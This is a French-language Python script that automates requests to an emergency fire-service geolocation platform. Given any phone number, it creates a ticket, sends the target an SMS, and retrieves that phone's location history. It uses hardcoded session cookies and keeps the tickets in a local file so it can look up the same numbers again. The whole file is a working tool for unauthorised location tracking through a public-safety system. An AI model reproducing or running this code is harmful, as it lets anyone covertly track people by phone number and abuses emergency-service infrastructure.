import requests
from requests.structures import CaseInsensitiveDict
import argparse
import json
import time
from bs4 import BeautifulSoup
import os

def send_first_request(phone_number):
    url = "https://geoloc.sdis28.fr/carto/create_ticket-valid.php"

    headers = CaseInsensitiveDict()
    headers["Cookie"] = "cookiesession1=678A3E1630EA4EAEA6B0D862440BF486; PHPSESSID=hi54mhs4i57k4hdg7q50q3b3ia"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    data = f"GSM=+33{phone_number}&Valid=1hour"

    response = requests.post(url, headers=headers, data=data)
    
    print(f"First Request Status Code: {response.status_code}")

    try:
        response_json = response.json()
        if "ticket" in response_json:
            ticket = response_json["ticket"]
            print(f"Ticket: {ticket}")
            return ticket
        else:
            print("Ticket non trouvé dans la réponse.")
            return None
    except json.JSONDecodeError:
        print("La réponse n'est pas en format JSON.")
        return None

def souscription(ticket):
    url = "https://geoloc.sdis28.fr/AML/API_souscription.php"

    headers = CaseInsensitiveDict()
    headers["Cookie"] = "cookiesession1=678A3E1630EA4EAEA6B0D862440BF486; PHPSESSID=hi54mhs4i57k4hdg7q50q3b3ia"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    data = f"ticket={ticket}&validity=1hour"

    response = requests.post(url, headers=headers, data=data)

    print(f"Souscription Request Status Code: {response.status_code} | Ticket: {ticket}")

def send_sms_request(ticket):

    url = "https://geoloc.sdis28.fr/sms/send_sms_lang_token_video.php"

    headers = CaseInsensitiveDict()
    headers["Cookie"] = "cookiesession1=678A3E1630EA4EAEA6B0D862440BF486; PHPSESSID=hi54mhs4i57k4hdg7q50q3b3ia"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"
    headers["Content-Type"] = "application/x-www-form-urlencoded"

    data = f"ticket={ticket}&langue=FR"
    
    resp = requests.post(url, headers=headers, data=data)

    print(f"Sms Request Status Code: {resp.status_code} | Ticket: {ticket}")

def send_logs_request(phone_number, ticket):
    url = "https://geoloc.sdis28.fr/AML/API_Localisation.php"

    headers = CaseInsensitiveDict()
    headers["Cookie"] = "cookiesession1=678A3E1630EA4EAEA6B0D862440BF486; PHPSESSID=hi54mhs4i57k4hdg7q50q3b3ia"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"

    data = f"GSM=33{phone_number}&ticket={ticket}"

    response = requests.post(url, headers=headers, data=data)
    
    print(f"Logs Request Status Code: {response.status_code} | Ticket: {ticket}")

def get_logs_request(ticket):
    url = f"https://geoloc.sdis28.fr/carto/get_data_histo.php?IDSession={ticket}"

    headers = CaseInsensitiveDict()
    headers["Cookie"] = "cookiesession1=678A3E1630EA4EAEA6B0D862440BF486; PHPSESSID=hi54mhs4i57k4hdg7q50q3b3ia"
    headers["User-Agent"] = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/123.0.0.0 Safari/537.36 OPR/109.0.0.0"


    response = requests.get(url, headers=headers)

    print(f"Logs Status Code: {response.status_code}")
    formatted_logs = format_logs(response.text)
    print(f"\n{formatted_logs}")

def format_logs(logs_html):
    soup = BeautifulSoup(logs_html, 'html.parser')
    logs_div = soup.find('div', class_='well')
    if not logs_div:
        return "Aucun log trouvé."

    logs = logs_div.get_text(separator="\n")
    return logs

def save_to_json(phone_number, ticket):
    data = load_from_json() or {}
    if phone_number in data:
        data[phone_number].append(ticket)
    else:
        data[phone_number] = [ticket]
        
    with open('ticket_info.json', 'w') as json_file:
        json.dump(data, json_file, indent=4)
    print("Informations sauvegardées dans ticket_info.json")

def load_from_json():
    if os.path.exists('ticket_info.json'):
        try:
            with open('ticket_info.json', 'r') as json_file:
                data = json.load(json_file)
                return data
        except json.JSONDecodeError:
            print("Le fichier ticket_info.json est vide ou contient un JSON invalide.")
            return None
    else:
        return None

def choose_ticket(tickets):
    print("tickets trouvés pour ce numéro. Veuillez choisir un ticket :")
    for idx, ticket in enumerate(tickets, start=1):
        print(f"{idx}. {ticket}")
    choice = int(input("Entrez le numéro du ticket choisi : ")) - 1
    return tickets[choice]

if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Envoyer des requêtes POST avec un numéro de téléphone.')
    parser.add_argument('-n', '--number', required=True, help='Le numéro de téléphone à envoyer')

    args = parser.parse_args()
    phone_number = args.number

    saved_data = load_from_json()
    if saved_data and phone_number in saved_data:
        print(f"Des tickets existent déjà pour le numéro {phone_number}: {saved_data[phone_number]}")
        choice = input("Voulez-vous refaire toutes les requêtes (r) ou voir les logs (l) ou choisir un ticket (c) ? ")
        if choice.lower() == 'l':
            chosen_ticket = choose_ticket(saved_data[phone_number])
            get_logs_request(chosen_ticket)
        elif choice.lower() == 'r':
            ticket = send_first_request(phone_number)
            if ticket:
                save_to_json(phone_number, ticket)
                send_logs_request(phone_number, ticket)
                souscription(ticket)
                time.sleep(2)
                send_sms_request(ticket)
        elif choice.lower() == 'c':
            chosen_ticket = choose_ticket(saved_data[phone_number])
            get_logs_request(chosen_ticket)
    else:
        ticket = send_first_request(phone_number)
        if ticket:
            save_to_json(phone_number, ticket)
            send_logs_request(phone_number, ticket)
            souscription(ticket)
            time.sleep(2)
            send_sms_request(ticket)
